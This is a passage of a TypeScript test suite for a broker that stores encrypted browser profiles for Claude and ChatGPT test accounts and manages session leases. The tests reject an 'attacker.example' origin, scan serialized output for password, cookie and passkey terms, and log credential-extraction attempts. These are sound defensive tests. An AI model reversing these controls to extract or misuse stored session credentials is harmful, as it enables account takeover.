/*
 * Copyright (c) 2026 Rorca Inc.
 * SPDX-License-Identifier: Apache-2.0
 * Licensed under the Apache License, Version 2.0.
 * See LICENSE file in the project root for full license text.
 */

import { promises as fs } from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { BrowserProfileProviderBindingSchema, type BrowserProfileProviderBinding } from '../authority-provider-adapter';
import {
  BrowserSessionBroker,
  EncryptedBrowserProfileSecretStore,
  type BrowserAuthenticationObservation,
  type BrowserAuthenticationRequestRecord,
  type BrowserAuthenticationRequestRepository,
  type BrowserAuthenticationRequestState,
  type BrowserAuthenticationRevalidation,
  type BrowserProfileArtifactIdentity,
  type BrowserProfileBindingRecord,
  type BrowserProfileHealth,
  type BrowserProfileLifecycleReason,
  type BrowserProfileRepository,
  type BrowserSessionAction,
  type BrowserSessionGrantRecord,
  type BrowserSessionEvidenceObservation,
  type BrowserSessionActionResult,
  type BrowserSessionLeaseRecord,
  type BrowserSessionLeaseRepository,
  type BrowserSessionRevocation,
  type BrowserSessionRunnerHost,
  type BrowserSessionRunnerLaunch,
  type BrowserSessionUse,
  type IsolatedBrowserRunnerMountPort,
} from '../browser-session-broker';
import {
  ConflictError,
  ForbiddenError,
  NotFoundError,
  ServiceUnavailableError,
  UnprocessableError,
  ValidationError,
} from '../errors';

const NOW = '2026-08-21T12:00:00.000Z';
const HEALTHY: BrowserProfileHealth = {
  provider: 'healthy',
  session: 'healthy',
  observedAt: NOW,
};
const PROFILE_PLAINTEXT = 'browser-profile-cookie-database-and-passkey-state';

function profileBytes(): Buffer {
  return Buffer.from(PROFILE_PLAINTEXT, 'utf8');
}

class MemoryBrowserProfileRepository implements BrowserProfileRepository {
  readonly records = new Map<string, BrowserProfileBindingRecord>();
  readonly denials: Array<{ reason: string; origin: string }> = [];
  revokedLeaseCount = 0;

  async createPending(record: BrowserProfileBindingRecord): Promise<BrowserProfileBindingRecord> {
    const duplicate = [...this.records.values()].some((candidate) => (
      candidate.externalProvider === record.externalProvider && candidate.accountAlias === record.accountAlias
    ));
    if (duplicate) throw new ConflictError('This dedicated provider test identity is already enrolled');
    this.records.set(record.id, structuredClone(record));
    return structuredClone(record);
  }

  async completeEnrollment(bindingId: string, secretRef: string, health: BrowserProfileHealth): Promise<BrowserProfileBindingRecord> {
    const record = this.records.get(bindingId);
    if (!record) throw new NotFoundError('Browser profile binding', bindingId);
    if (record.lifecycleState !== 'pending') throw new ConflictError('Browser profile enrollment is already settled');
    Object.assign(record, {
      profileSecretRef: secretRef,
      lifecycleState: 'active',
      bindingStatus: 'active',
      providerHealth: health.provider,
      sessionHealth: health.session,
      healthObservedAt: health.observedAt,
    });
    return structuredClone(record);
  }

  async findByIdentity(workspaceId: string, provider: 'claude' | 'chatgpt', accountAlias: string): Promise<BrowserProfileBindingRecord | null> {
    const record = [...this.records.values()].find((candidate) => (
      candidate.workspaceId === workspaceId
      && candidate.externalProvider === provider
      && candidate.accountAlias === accountAlias
    ));
    return record ? structuredClone(record) : null;
  }

  async findById(bindingId: string): Promise<BrowserProfileBindingRecord | null> {
    const record = this.records.get(bindingId);
    return record ? structuredClone(record) : null;
  }

  async listActiveBindings(): Promise<BrowserProfileBindingRecord[]> {
    return [...this.records.values()]
      .filter((record) => record.lifecycleState === 'active' && record.bindingStatus === 'active')
      .map((record) => structuredClone(record));
  }

  async transitionLifecycle(
    bindingId: string,
    workspaceId: string,
    target: 'quarantined' | 'deleted',
    _reason: BrowserProfileLifecycleReason,
  ): Promise<BrowserProfileBindingRecord> {
    const record = this.records.get(bindingId);
    if (!record || record.workspaceId !== workspaceId) throw new NotFoundError('Browser profile binding', bindingId);
    if (record.lifecycleState === 'pending' || record.lifecycleState === 'deleted') {
      throw new ConflictError('Invalid lifecycle transition');
    }
    record.lifecycleState = target;
    record.bindingStatus = 'disabled';
    this.revokedLeaseCount += 1;
    return structuredClone(record);
  }

  async recordUseDenied(_binding: BrowserProfileBindingRecord, reason: string, origin: string): Promise<void> {
    this.denials.push({ reason, origin });
  }
}

class MemoryBrowserSessionLeaseRepository implements BrowserSessionLeaseRepository {
  readonly grants = new Map<string, BrowserSessionGrantRecord>();
  readonly leases = new Map<string, BrowserSessionLeaseRecord>();
  readonly securityEvents: Array<{
    reason: string;
    requestedOrigin: '[redacted]' | null;
    effect: string;
  }> = [];

  constructor(private readonly profiles: MemoryBrowserProfileRepository) {}

  async createGrant(grant: BrowserSessionGrantRecord): Promise<BrowserSessionGrantRecord> {
    this.grants.set(grant.id, structuredClone(grant));
    return structuredClone(grant);
  }

  async findGrant(grantId: string): Promise<BrowserSessionGrantRecord | null> {
    const grant = this.grants.get(grantId);
    return grant ? structuredClone(grant) : null;
  }

  async reserveLease(
    lease: BrowserSessionLeaseRecord,
    _profileHealthStaleBefore: string,
    heartbeatStaleBefore: string,
  ): Promise<BrowserSessionLeaseRecord> {
    const grant = this.grants.get(lease.grantId);
    if (!grant || grant.state !== 'active' || Date.parse(grant.expiresAt) <= Date.parse(lease.issuedAt)) {
      throw new ConflictError('Grant expired');
    }
    const bindingLeases = [...this.leases.values()].filter((candidate) => (
      candidate.bindingId === lease.bindingId && candidate.state === 'uncertain'
    ));
    if (bindingLeases.length > 0) throw new ConflictError('Reconciliation required');
    for (const candidate of this.leases.values()) {
      if (candidate.bindingId === lease.bindingId
        && (candidate.state === 'active' || candidate.state === 'provisioning')
        && Date.parse(candidate.expiresAt) <= Date.parse(lease.issuedAt)) {
        await this.markUncertain(candidate.id, 'lease_expired_pending_reconciliation', lease.issuedAt);
        throw new ConflictError('Reconciliation required');
      }
      if (candidate.bindingId === lease.bindingId
        && (candidate.state === 'active' || candidate.state === 'provisioning')
        && Date.parse(candidate.lastHeartbeatAt) < Date.parse(heartbeatStaleBefore)) {
        await this.markUncertain(candidate.id, 'runner_heartbeat_lost', lease.issuedAt);
        throw new ConflictError('Reconciliation required');
      }
    }
    const active = [...this.leases.values()].filter((candidate) => (
      candidate.bindingId === lease.bindingId
      && (candidate.state === 'active' || candidate.state === 'provisioning')
      && Date.parse(candidate.expiresAt) > Date.parse(lease.issuedAt)
    ));
    const effectiveLimit = active.reduce(
      (limit, candidate) => Math.min(limit, candidate.maximumConcurrentRunners),
      grant.maximumConcurrentRunners,
    );
    if (active.length >= effectiveLimit) throw new ConflictError('Concurrency exhausted');
    this.leases.set(lease.id, structuredClone(lease));
    return structuredClone(lease);
  }

  async activateLease(leaseId: string, activatedAt: string): Promise<BrowserSessionLeaseRecord> {
    const lease = this.requireLease(leaseId);
    if (lease.state !== 'provisioning') throw new ConflictError('Lease not provisioning');
    lease.state = 'active';
    lease.lastHeartbeatAt = activatedAt;
    return structuredClone(lease);
  }

  async authorizeUse(
    input: BrowserSessionUse,
    requestedOrigin: string | null,
    usedAt: string,
    heartbeatStaleBefore: string,
  ): Promise<BrowserSessionLeaseRecord> {
    const lease = this.requireLease(input.leaseId);
    this.assertIdentity(lease, input);
    if (lease.state !== 'active') throw new ConflictError('Lease is inactive');
    if (Date.parse(lease.expiresAt) <= Date.parse(usedAt)) {
      await this.markUncertain(lease.id, 'lease_expired_pending_reconciliation', usedAt);
      throw new ConflictError('Lease expired; reconciliation required');
    }
    if (Date.parse(lease.lastHeartbeatAt) < Date.parse(heartbeatStaleBefore)) {
      await this.markUncertain(lease.id, 'runner_heartbeat_lost', usedAt);
      throw new ConflictError('Reconciliation required');
    }
    if (!lease.allowedActions.includes(input.action.type)) {
      await this.recordSecurityEvent({
        leaseId: lease.id,
        reason: 'action_not_allowed',
        requestedOrigin,
        effect: input.action.type,
        observedAt: usedAt,
      });
      throw new ForbiddenError('Action denied');
    }
    if (requestedOrigin !== null && !lease.allowedOrigins.includes(requestedOrigin)) {
      await this.recordSecurityEvent({
        leaseId: lease.id,
        reason: 'origin_not_allowlisted',
        requestedOrigin,
        effect: input.action.type,
        observedAt: usedAt,
      });
      throw new ForbiddenError('Origin denied');
    }
    lease.lastHeartbeatAt = usedAt;
    return structuredClone(lease);
  }

  async markUncertain(leaseId: string, reason: string, observedAt: string): Promise<BrowserSessionLeaseRecord> {
    const lease = this.requireLease(leaseId);
    lease.state = 'uncertain';
    lease.revokedAt = observedAt;
    lease.revocationReason = reason;
    const profile = this.profiles.records.get(lease.bindingId)!;
    profile.providerHealth = 'degraded';
    profile.sessionHealth = 'unknown';
    profile.healthObservedAt = observedAt;
    return structuredClone(lease);
  }

  async beginRevocation(input: BrowserSessionRevocation, observedAt: string): Promise<BrowserSessionLeaseRecord> {
    const lease = this.requireLease(input.leaseId);
    this.assertIdentity(lease, input);
    if (lease.state === 'revoked' || lease.state === 'expired') return structuredClone(lease);
    lease.state = 'uncertain';
    lease.revokedAt = observedAt;
    lease.revocationReason = 'revocation_in_progress';
    return structuredClone(lease);
  }

  async completeRevocation(leaseId: string, reason: string, observedAt: string): Promise<BrowserSessionLeaseRecord> {
    const lease = this.requireLease(leaseId);
    if (lease.state === 'expired') return structuredClone(lease);
    lease.state = 'revoked';
    lease.revokedAt = observedAt;
    lease.revocationReason = reason;
    return structuredClone(lease);
  }

  async completeReconciliation(
    leaseId: string,
    health: BrowserProfileHealth,
    observedAt: string,
  ): Promise<BrowserSessionLeaseRecord> {
    const lease = this.requireLease(leaseId);
    if (lease.state !== 'uncertain') throw new ConflictError('Lease is not uncertain');
    lease.state = 'revoked';
    lease.revokedAt = observedAt;
    lease.revocationReason = 'runner_reconciled';
    const profile = this.profiles.records.get(lease.bindingId)!;
    profile.providerHealth = health.provider;
    profile.sessionHealth = health.session;
    profile.healthObservedAt = health.observedAt;
    return structuredClone(lease);
  }

  async recordSecurityEvent(input: {
    leaseId: string;
    reason:
      | 'action_not_allowed'
      | 'credential_extraction_attempt'
      | 'origin_not_allowlisted'
      | 'network_origin_not_allowlisted';
    requestedOrigin: string | null;
    effect: string;
    observedAt: string;
  }): Promise<void> {
    this.requireLease(input.leaseId);
    this.securityEvents.push({
      reason: input.reason,
      requestedOrigin: input.requestedOrigin === null ? null : '[redacted]',
      effect: input.effect,
    });
  }

  async findLease(leaseId: string): Promise<BrowserSessionLeaseRecord | null> {
    const lease = this.leases.get(leaseId);
    return lease ? structuredClone(lease) : null;
  }

  async listOpenLeases(bindingId: string, workspaceId: string): Promise<BrowserSessionLeaseRecord[]> {
    return [...this.leases.values()]
      .filter((lease) => lease.bindingId === bindingId
        && lease.workspaceId === workspaceId
        && ['provisioning', 'active', 'uncertain'].includes(lease.state))
      .map((lease) => structuredClone(lease));
  }

  async listOpenLeasesForBroker(): Promise<BrowserSessionLeaseRecord[]> {
    return [...this.leases.values()]
      .filter((lease) => ['provisioning', 'active', 'uncertain'].includes(lease.state))
      .map((lease) => structuredClone(lease));
  }

  async revokeOpenGrants(reason: string, observedAt: string): Promise<number> {
    let revoked = 0;
    for (const grant of this.grants.values()) {
      if (grant.state !== 'active') continue;
      grant.state = 'revoked';
      grant.revokedAt = observedAt;
      grant.revocationReason = reason;
      revoked += 1;
    }
    return revoked;
  }

  private requireLease(leaseId: string): BrowserSessionLeaseRecord {
    const lease = this.leases.get(leaseId);
    if (!lease) throw new NotFoundError('Browser session lease', leaseId);
    return lease;
  }

  private assertIdentity(
    lease: BrowserSessionLeaseRecord,
    input: Pick<BrowserSessionUse, 'bindingId' | 'workspaceId' | 'externalProvider' | 'runId' | 'storyId' | 'purpose' | 'profileGeneration'>,
  ): void {
    if (lease.bindingId !== input.bindingId
      || lease.workspaceId !== input.workspaceId
      || lease.externalProvider !== input.externalProvider
      || lease.runId !== input.runId
      || lease.storyId !== input.storyId
      || lease.purpose !== input.purpose
      || lease.profileGeneration !== input.profileGeneration) {
      throw new ForbiddenError('Lease identity mismatch');
    }
  }
}

class MemoryBrowserAuthenticationRequestRepository implements BrowserAuthenticationRequestRepository {
  readonly requests = new Map<string, BrowserAuthenticationRequestRecord>();

  async createWait(request: BrowserAuthenticationRequestRecord): Promise<BrowserAuthenticationRequestRecord> {
    const open = [...this.requests.values()].find((candidate) => (
      candidate.workspaceId === request.workspaceId
      && candidate.runId === request.runId
      && (candidate.state === 'WAITING_FOR_AUTHENTICATION' || candidate.state === 'REVALIDATING')
    ));
    if (open) throw new ConflictError('Run already waiting');
    const stored = structuredClone({ ...request, runPauseOwned: true });
    this.requests.set(stored.requestId, stored);
    return structuredClone(stored);
  }

  async findById(requestId: string): Promise<BrowserAuthenticationRequestRecord | null> {
    const request = this.requests.get(requestId);
    return request ? structuredClone(request) : null;
  }

  async findOpenForRun(workspaceId: string, runId: string): Promise<BrowserAuthenticationRequestRecord | null> {
    const request = [...this.requests.values()].find((candidate) => (
      candidate.workspaceId === workspaceId
      && candidate.runId === runId
      && (candidate.state === 'WAITING_FOR_AUTHENTICATION' || candidate.state === 'REVALIDATING')
    ));
    return request ? structuredClone(request) : null;
  }

  async findLatestForRun(workspaceId: string, runId: string): Promise<BrowserAuthenticationRequestRecord | null> {
    const requests = [...this.requests.values()].filter((candidate) => (
      candidate.workspaceId === workspaceId && candidate.runId === runId
    ));
    const request = requests.at(-1);
    return request ? structuredClone(request) : null;
  }

  async claimForRevalidation(
    requestId: string,
    workspaceId: string,
    runId: string,
    operatorId: string,
    observedAt: string,
  ): Promise<BrowserAuthenticationRequestRecord> {
    const request = this.requireRequest(requestId);
    if (request.workspaceId !== workspaceId || request.runId !== runId) throw new ForbiddenError('Run mismatch');
    if (request.state === 'REVALIDATING') return structuredClone(request);
    if (request.state !== 'WAITING_FOR_AUTHENTICATION') throw new ConflictError('Already settled');
    if (Date.parse(request.authenticationExpiresAt) <= Date.parse(observedAt)) throw new ConflictError('Expired');
    request.state = 'REVALIDATING';
    request.resolvedBy = operatorId;
    return structuredClone(request);
  }

  async settle(input: Parameters<BrowserAuthenticationRequestRepository['settle']>[0]): Promise<BrowserAuthenticationRequestRecord> {
    const request = this.requireRequest(input.requestId);
    if (request.workspaceId !== input.workspaceId || request.runId !== input.runId) throw new ForbiddenError('Run mismatch');
    if (!input.expectedStates.includes(request.state as Extract<BrowserAuthenticationRequestState, 'WAITING_FOR_AUTHENTICATION' | 'REVALIDATING'>)) {
      if (request.state === input.state && request.outcomeCode === input.outcomeCode) return structuredClone(request);
      throw new ConflictError('State fence lost');
    }
    request.state = input.state;
    request.disposition = input.disposition;
    request.outcomeCode = input.outcomeCode;
    request.resolutionObservation = input.resolutionObservation;
    request.resolvedBy = input.resolvedBy;
    request.resolvedAt = input.resolvedAt;
    request.resumedAt = input.state === 'RESUMED' ? input.resolvedAt : null;
    request.resumeCount = input.state === 'RESUMED' ? 1 : 0;
    return structuredClone(request);
  }

  private requireRequest(requestId: string): BrowserAuthenticationRequestRecord {
    const request = this.requests.get(requestId);
    if (!request) throw new NotFoundError('Browser authentication request', requestId);
    return request;
  }
}


class MemoryBrowserSessionRunnerHost implements BrowserSessionRunnerHost {
  readonly runners = new Map<string, BrowserSessionRunnerLaunch>();
  readonly mounts: Array<Record<string, unknown>> = [];
  readonly transientProfileBytes: Buffer[] = [];
  readonly terminated: string[] = [];
  readonly cleared: string[] = [];
  used = 0;
  useFailure = false;
  launchFailure = false;
  termination: 'terminated' | 'uncertain' = 'terminated';
  terminationFailure = false;
  suspensionFailure = false;
  resumeFailure = false;
  reconciliationHealth: BrowserProfileHealth = HEALTHY;
  observation: BrowserAuthenticationObservation | null = null;
  revalidation: BrowserAuthenticationRevalidation = {
    schemaVersion: 'rorca.browser-authentication-revalidation.v1',
    observedAt: NOW,
    currentOrigin: 'https://claude.ai',
    providerStateDigest: `sha256:${'b'.repeat(64)}`,
    accessibilityDigest: `sha256:${'c'.repeat(64)}`,
    challengePresent: false,
    health: HEALTHY,
    redaction: 'required',
  };
  readonly suspended = new Set<string>();
  readonly resumedRequests = new Set<string>();
  resumeCalls = 0;

  async launch(input: BrowserSessionRunnerLaunch): Promise<IsolatedBrowserRunnerMountPort> {
    if (this.runners.has(input.runnerId)) throw new ConflictError('Runner reused');
    if (this.launchFailure) throw new ServiceUnavailableError('Injected lease issue crash');
    this.runners.set(input.runnerId, input);
    return {
      mountProfile: async (mount) => {
        expect(mount.profileBytes).toEqual(profileBytes());
        this.transientProfileBytes.push(mount.profileBytes);
        this.mounts.push({
          runnerId: mount.runnerId,
          bindingId: mount.bindingId,
          profileGeneration: mount.profileGeneration,
          allowedOrigins: mount.allowedOrigins,
          modelContextAccess: mount.modelContextAccess,
          filesystemAccess: mount.filesystemAccess,
          artifactAccess: mount.artifactAccess,
        });
      },
    };
  }

  async use(runnerId: string, _action: BrowserSessionAction): Promise<BrowserSessionActionResult> {
    if (!this.runners.has(runnerId)) throw new ServiceUnavailableError('Runner missing');
    if (this.suspended.has(runnerId)) throw new ConflictError('Automation suspended');
    this.used += 1;
    if (this.useFailure) throw new ServiceUnavailableError('Injected runner action crash');
    return this.observation
      ? { kind: 'authentication_required', observation: structuredClone(this.observation) }
      : { kind: 'completed', result: 'bounded-result' };
  }

  async captureEvidence(runnerId: string): Promise<BrowserSessionEvidenceObservation> {
    if (!this.runners.has(runnerId)) throw new ServiceUnavailableError('Runner missing');
    return {
      observedAt: NOW,
      currentOrigin: 'https://claude.ai',
      screenshot: {
        artifactId: 'redacted-screenshot',
        digest: `sha256:${'1'.repeat(64)}`,
        mediaType: 'image/png',
      },
      accessibilitySnapshot: {
        artifactId: 'redacted-accessibility-snapshot',
        digest: `sha256:${'2'.repeat(64)}`,
        mediaType: 'text/aria-snapshot',
      },
      networkMetadata: [],
      providerStateDigest: `sha256:${'3'.repeat(64)}`,
      authenticatedSessionObserved: true,
      redaction: 'sensitive-elements-masked-and-accessible-text-removed',
    };
  }

  async suspendForAuthentication(
    runnerId: string,
    _observation: BrowserAuthenticationObservation,
  ): Promise<{ checkpointDigest: `sha256:${string}` }> {
    if (!this.runners.has(runnerId)) throw new ServiceUnavailableError('Runner missing');
    this.suspended.add(runnerId);
    if (this.suspensionFailure) {
      throw new ServiceUnavailableError('Authentication checkpoint persistence failed');
    }
    return { checkpointDigest: `sha256:${'a'.repeat(64)}` };
  }

  async revalidateAuthentication(
    runnerId: string,
    _request: BrowserAuthenticationRequestRecord,
  ): Promise<BrowserAuthenticationRevalidation> {
    if (!this.suspended.has(runnerId)) throw new ConflictError('Runner not suspended');
    return structuredClone(this.revalidation);
  }

  async resumeAfterAuthentication(runnerId: string, requestId: string): Promise<'resumed' | 'already_resumed'> {
    if (this.resumedRequests.has(requestId)) return 'already_resumed';
    if (this.resumeFailure) throw new ServiceUnavailableError('Runner resume checkpoint failed');
    this.resumeCalls += 1;
    this.resumedRequests.add(requestId);
    this.suspended.delete(runnerId);
    return 'resumed';
  }

  async terminate(runnerId: string): Promise<'terminated' | 'uncertain'> {
    this.terminated.push(runnerId);
    if (this.terminationFailure) throw new ServiceUnavailableError('Runner termination transport failed');
    return this.termination;
  }

  async clearEphemeralState(runnerId: string): Promise<void> {
    this.cleared.push(runnerId);
    this.runners.delete(runnerId);
    this.suspended.delete(runnerId);
  }

  async reconcile(runnerId: string): Promise<{ termination: 'terminated' | 'uncertain'; health: BrowserProfileHealth }> {
    this.terminated.push(runnerId);
    return { termination: this.termination, health: this.reconciliationHealth };
  }
}

function enrollmentInput(provider: 'claude' | 'chatgpt', accountAlias: string, workspaceId = 'workspace-browser-tests') {
  return {
    workspaceId,
    externalProvider: provider,
    accountAlias,
    allowedOrigins: provider === 'claude'
      ? ['https://fixture.rorca.test', 'https://claude.ai']
      : ['https://fixture.rorca.test', 'https://chatgpt.com'],
    retentionPolicy: { mode: 'quarantine' as const, retainUntil: null },
    destructionPolicy: 'operator_delete' as const,
    operatorId: 'human-operator-7',
  };
}

async function enrollAndCapture(
  broker: BrowserSessionBroker,
  provider: 'claude' | 'chatgpt' = 'claude',
  accountAlias = `${provider}-conformance`,
  health: BrowserProfileHealth = HEALTHY,
) {
  const enrollment = await broker.beginEnrollment(enrollmentInput(provider, accountAlias));
  const capturedProfileBytes = profileBytes();
  const binding = await broker.captureEnrolledProfile({
    bindingId: enrollment.id,
    workspaceId: enrollment.workspaceId,
    externalProvider: enrollment.externalProvider,
    accountAlias: enrollment.accountAlias,
    health,
  }, capturedProfileBytes);
  return { enrollment, binding, capturedProfileBytes };
}

describe('BrowserSessionBroker', () => {
  let root: string;
  let repository: MemoryBrowserProfileRepository;
  let broker: BrowserSessionBroker;

  beforeEach(async () => {
    root = await fs.mkdtemp(path.join(os.tmpdir(), 'rorca-browser-profile-test-'));
    repository = new MemoryBrowserProfileRepository();
    const store = new EncryptedBrowserProfileSecretStore({ root, masterKey: Buffer.alloc(32, 0x5a) });
    broker = new BrowserSessionBroker(repository, store, () => true, () => NOW);
  });

  afterEach(async () => {
    await fs.rm(root, { recursive: true, force: true });
  });

  it('creates separate domain-bound ciphertext profiles and projects metadata plus opaque references only', async () => {
    const claude = await enrollAndCapture(broker, 'claude', 'claude-conformance');
    const chatgpt = await enrollAndCapture(broker, 'chatgpt', 'chatgpt-conformance');
    expect(claude.capturedProfileBytes.every((byte) => byte === 0)).toBe(true);
    expect(chatgpt.capturedProfileBytes.every((byte) => byte === 0)).toBe(true);

    expect(claude.binding.secretReferences[0]!.secretId).not.toBe(chatgpt.binding.secretReferences[0]!.secretId);
    expect(claude.binding).toMatchObject({
      externalProvider: 'claude',
      accountAlias: 'claude-conformance',
      profileGeneration: 1,
      retentionPolicy: { mode: 'quarantine', retainUntil: null },
      enrollmentProvenance: { kind: 'human_operator', surface: 'operator_takeover', operatorId: 'human-operator-7' },
      health: { provider: 'healthy', session: 'healthy' },
      providerProfileVerified: true,
    });

    const files = await fs.readdir(root);
    expect(files).toHaveLength(2);
    const envelopes = await Promise.all(files.map((file) => fs.readFile(path.join(root, file))));
    expect(envelopes[0]!.equals(envelopes[1]!)).toBe(false);
    for (const envelope of envelopes) {
      const retained = envelope.toString('utf8');
      expect(retained).not.toContain(PROFILE_PLAINTEXT);
      expect(retained).not.toContain('claude-conformance');
      expect(retained).not.toContain('chatgpt-conformance');
    }

    const serialized = JSON.stringify([claude.binding, chatgpt.binding]);
    expect(serialized).not.toContain(PROFILE_PLAINTEXT);
    expect(serialized).not.toMatch(/password|cookie|totp|passkey|recovery.?code/i);
    expect(BrowserProfileProviderBindingSchema.safeParse({
      ...claude.binding,
      allowedOrigins: ['http://claude.ai'],
    }).success).toBe(false);
  });

  it('validates canonical domain identity before persistence and rejects cross-identity mounts', async () => {
    const store = new EncryptedBrowserProfileSecretStore({ root, masterKey: Buffer.alloc(32, 0x5a) });
    const identity: BrowserProfileArtifactIdentity = {
      bindingId: '11111111-1111-4111-8111-111111111111',
      workspaceId: 'workspace-browser-tests',
      externalProvider: 'claude',
      accountAlias: 'domain-bound-profile',
      profileGeneration: 1,
      allowedOrigins: ['https://claude.ai', 'https://fixture.rorca.test'],
    };

    await expect(store.storeProfile({
      ...identity,
      allowedOrigins: ['https://claude.ai', 'https://CLAUDE.AI'],
    }, profileBytes())).rejects.toBeInstanceOf(ValidationError);
    await expect(fs.readdir(root)).resolves.toEqual([]);

    const secretRef = await store.storeProfile(identity, profileBytes());
    const mountProfile = jest.fn();
    for (const mismatch of [
      { workspaceId: 'other-workspace' },
      { externalProvider: 'chatgpt' as const },
      { accountAlias: 'other-account' },
      { allowedOrigins: ['https://attacker.example'] },
    ]) {
      await expect(store.mountProfile(secretRef, {
        ...identity,
        ...mismatch,
      }, 'isolated-runner-cross-identity', { mountProfile })).rejects.toBeInstanceOf(ForbiddenError);
    }
    expect(mountProfile).not.toHaveBeenCalled();
  });

  it('refuses to verify or mount a tampered encrypted profile', async () => {
    const store = new EncryptedBrowserProfileSecretStore({ root, masterKey: Buffer.alloc(32, 0x5a) });
    const identity: BrowserProfileArtifactIdentity = {
      bindingId: '11111111-1111-4111-8111-111111111111',
      workspaceId: 'workspace-browser-tests',
      externalProvider: 'claude',
      accountAlias: 'tamper-proof-profile',
      profileGeneration: 1,
      allowedOrigins: ['https://claude.ai'],
    };
    const secretRef = await store.storeProfile(identity, profileBytes());
    const artifactPath = path.join(root, `${secretRef}.profile.enc`);
    const envelope = await fs.readFile(artifactPath);
    envelope[envelope.length - 1] ^= 0xff;
    await fs.writeFile(artifactPath, envelope);

    await expect(store.verifyReference(secretRef, identity)).resolves.toBe(false);
    const mountProfile = jest.fn();
    await expect(store.mountProfile(secretRef, identity, 'isolated-runner-corrupt', { mountProfile }))
      .rejects.toBeInstanceOf(UnprocessableError);
    expect(mountProfile).not.toHaveBeenCalled();
  });


  it('erases rejected capture buffers and rejects cross-provider, account, and workspace capture before persistence', async () => {
    const enrollment = await broker.beginEnrollment(enrollmentInput('claude', 'capture-bound-profile'));
    const mismatches = [
      { workspaceId: 'wrong-workspace' },
      { externalProvider: 'chatgpt' as const },
      { accountAlias: 'different-account' },
    ];

    for (const mismatch of mismatches) {
      const capturedProfileBytes = profileBytes();
      await expect(broker.captureEnrolledProfile({
        bindingId: enrollment.id,
        workspaceId: enrollment.workspaceId,
        externalProvider: enrollment.externalProvider,
        accountAlias: enrollment.accountAlias,
        health: HEALTHY,
        ...mismatch,
      }, capturedProfileBytes)).rejects.toBeInstanceOf(ForbiddenError);
      expect(capturedProfileBytes.every((byte) => byte === 0)).toBe(true);
    }

    await expect(fs.readdir(root)).resolves.toEqual([]);
    expect(repository.records.get(enrollment.id)).toMatchObject({
      lifecycleState: 'pending',
      profileSecretRef: null,
    });
  });

  it('records human provenance and health without admitting a reused provider identity across workspaces', async () => {
    const first = await broker.beginEnrollment(enrollmentInput('claude', 'immutable-alias', 'workspace-one'));
    expect(first.enrollmentProvenance).toEqual({
      kind: 'human_operator',
      operatorId: 'human-operator-7',
      surface: 'operator_takeover',
      enrolledAt: NOW,
    });
    expect(first).toMatchObject({ providerHealth: 'degraded', sessionHealth: 'unknown' });

    await expect(broker.beginEnrollment(enrollmentInput('claude', 'immutable-alias', 'workspace-two')))
      .rejects.toBeInstanceOf(ConflictError);
  });

  it('resumes one exact pending enrollment after handoff loss without duplicating onboarding', async () => {
    const input = enrollmentInput('claude', 'retry-safe-enrollment');
    const first = await broker.beginEnrollment(input);
    const resumed = await broker.beginEnrollment(input);

    expect(resumed).toEqual(first);
    expect(repository.records.size).toBe(1);
    await expect(broker.beginEnrollment({
      ...input,
      allowedOrigins: ['https://claude.ai'],
    })).rejects.toBeInstanceOf(ConflictError);
    expect(repository.records.size).toBe(1);
  });


  it('quarantines then deletes without losing the redacted binding identity', async () => {
    const { binding } = await enrollAndCapture(broker);
    const secretRef = binding.secretReferences[0]!.secretId;
    const artifactPath = path.join(root, `${secretRef}.profile.enc`);

    const quarantined = await broker.quarantineProfile(
      binding.bindingId,
      binding.workspaceId,
      'operator_quarantine',
    );
    expect(quarantined).toMatchObject({ profileStatus: 'quarantined', bindingStatus: 'disabled' });
    expect(repository.revokedLeaseCount).toBe(1);
    await expect(fs.stat(artifactPath)).resolves.toBeDefined();

    const deleted = await broker.deleteProfile(binding.bindingId, binding.workspaceId, 'operator_delete');
    expect(deleted).toMatchObject({
      profileStatus: 'deleted',
      bindingStatus: 'disabled',
      accountAlias: 'claude-conformance',
      profileGeneration: 1,
    });
    expect(repository.revokedLeaseCount).toBe(2);
    await expect(fs.stat(artifactPath)).rejects.toMatchObject({ code: 'ENOENT' });
  });

  it('fails enrollment before persistence when the encrypted profile store is unavailable', async () => {
    const previousMasterKey = process.env.RORCA_BROWSER_PROFILE_MASTER_KEY;
    delete process.env.RORCA_BROWSER_PROFILE_MASTER_KEY;
    try {
      const unavailableStore = new EncryptedBrowserProfileSecretStore({ root });
      const unavailableBroker = new BrowserSessionBroker(
        repository,
        unavailableStore,
        () => true,
        () => NOW,
      );
      await expect(unavailableBroker.beginEnrollment(enrollmentInput('claude', 'store-unavailable')))
        .rejects.toBeInstanceOf(ServiceUnavailableError);
      expect(repository.records.size).toBe(0);
    } finally {
      if (previousMasterKey === undefined) delete process.env.RORCA_BROWSER_PROFILE_MASTER_KEY;
      else process.env.RORCA_BROWSER_PROFILE_MASTER_KEY = previousMasterKey;
    }
  });

  it('requires explicit rollout enablement and never advertises delivery authority', async () => {
    const previous = process.env.RORCA_BROWSER_SESSION_BROKER_ENABLED;
    const store = new EncryptedBrowserProfileSecretStore({ root, masterKey: Buffer.alloc(32, 0x5a) });
    const environmentBroker = new BrowserSessionBroker(repository, store, undefined, () => NOW);
    try {
      process.env.RORCA_BROWSER_SESSION_BROKER_ENABLED = 'false';
      await expect(environmentBroker.beginEnrollment(enrollmentInput('claude', 'disabled-by-environment')))
        .rejects.toBeInstanceOf(ForbiddenError);

      process.env.RORCA_BROWSER_SESSION_BROKER_ENABLED = 'true';
      await expect(environmentBroker.beginEnrollment(enrollmentInput('claude', 'enabled-by-environment')))
        .resolves.toMatchObject({ accountAlias: 'enabled-by-environment', lifecycleState: 'pending' });
      expect(environmentBroker.descriptor.supportsExternalChangeRequest).toBe(false);
      expect(environmentBroker.capabilities).not.toContain('browser.profile.use');
      expect(environmentBroker.capabilities).toEqual(expect.arrayContaining([
        'browser.session.request',
        'browser.session.use',
        'browser.session.revoke',
        'browser.session.reconcile',
      ]));
    } finally {
      if (previous === undefined) delete process.env.RORCA_BROWSER_SESSION_BROKER_ENABLED;
      else process.env.RORCA_BROWSER_SESSION_BROKER_ENABLED = previous;
    }
  });

  it('stays disabled by default and never touches profile persistence', async () => {
    const disabled = new BrowserSessionBroker(repository, undefined, () => false, () => NOW);
    await expect(disabled.beginEnrollment(enrollmentInput('claude', 'disabled-profile')))
      .rejects.toBeInstanceOf(ForbiddenError);
    expect(repository.records.size).toBe(0);
  });

  describe('browser session grant and lease state machine', () => {
    let clock: string;
    let leaseRepository: MemoryBrowserSessionLeaseRepository;
    let authenticationRepository: MemoryBrowserAuthenticationRequestRepository;
    let runnerHost: MemoryBrowserSessionRunnerHost;

